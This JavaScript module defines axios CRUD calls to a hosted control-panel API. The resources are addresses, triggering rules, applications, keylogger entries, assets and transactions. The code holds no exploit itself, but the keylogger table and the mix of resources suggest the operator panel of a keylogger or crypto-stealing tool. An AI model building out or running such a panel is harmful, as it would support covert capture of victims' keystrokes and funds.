import axios from 'axios';

const API_URL = 'https://control-panel-15mm.onrender.com/api/v1'; // Replace with your actual API URL

export const fetchAddresses = async (params) => {
  const response = await axios.get(`${API_URL}/get/addresses`, { params });
  return response.data;
};

export const addAddress = async (addressData) => {
  const response = await axios.post(`${API_URL}/add/addresses`, addressData);
  return response.data;
};

export const deleteAddress = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/addresses/${id}`);
  return response.data;
};

export const updateAddress = async (id, addressData) => {
  const response = await axios.put(`${API_URL}/update/addresses/${id}`, addressData);
  return response.data;
};

//triggering rules


export const fetchTriggeringRules = async (params) => {
  const response = await axios.get(`${API_URL}/get/triggering-rules`, { params });
  return response.data;
};

export const addTriggeringRule = async (ruleData) => {
  const response = await axios.post(`${API_URL}/add/triggering-rules`, ruleData);
  return response.data;
};

export const deleteTriggeringRule = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/triggering-rules/${id}`);
  return response.data;
};

export const updateTriggeringRule = async (id, ruleData) => {
  const response = await axios.put(`${API_URL}/update/triggering-rules/${id}`, ruleData);
  return response.data;
};


//applications

export const fetchApplications = async (params) => {
  const response = await axios.get(`${API_URL}/get/applications`, { params });
  return response.data;
};

export const addApplication = async (applicationData) => {
  const response = await axios.post(`${API_URL}/add/application`, applicationData);
  return response.data;
};

export const updateApplication = async (id, applicationData) => {
  const response = await axios.put(`${API_URL}/update/application/${id}`, applicationData);
  return response.data;
};

export const deleteApplication = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/application/${id}`);
  return response.data;
};

//keylogger


export const fetchKeyloggerData = async (params) => {
  const response = await axios.get(`${API_URL}/get/keylogger`, { params });
  return response.data;
};

export const addKeyloggerEntry = async (entryData) => {
  const response = await axios.post(`${API_URL}/add/keylogger`, entryData);
  return response.data;
};

export const deleteKeyloggerEntry = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/keylogger/${id}`);
  return response.data;
};

export const updateKeyloggerEntry = async (id, entryData) => {
  const response = await axios.put(`${API_URL}/update/keylogger/${id}`, entryData);
  return response.data;
};


//assets table

export const fetchAssets = async (params) => {
  const response = await axios.get(`${API_URL}/get/assets`, { params });
  return response.data;
};

export const addAsset = async (assetData) => {
  const response = await axios.post(`${API_URL}/add/asset`, assetData);
  return response.data;
};

export const deleteAsset = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/asset/${id}`);
  return response.data;
};

export const updateAsset = async (id, assetData) => {
  const response = await axios.put(`${API_URL}/update/asset/${id}`, assetData);
  return response.data;
};



//transaction table


export const fetchTransactions = async (params) => {
  const response = await axios.get(`${API_URL}/get/transactions`, { params });
  return response.data;
};

export const addTransaction = async (transactionData) => {
  const response = await axios.post(`${API_URL}/add/transaction`, transactionData);
  return response.data;
};

export const updateTransaction = async (id, transactionData) => {
  const response = await axios.put(`${API_URL}/update/transaction/${id}`, transactionData);
  return response.data;
};

export const deleteTransaction = async (id) => {
  const response = await axios.delete(`${API_URL}/delete/transaction/${id}`);
  return response.data;
};


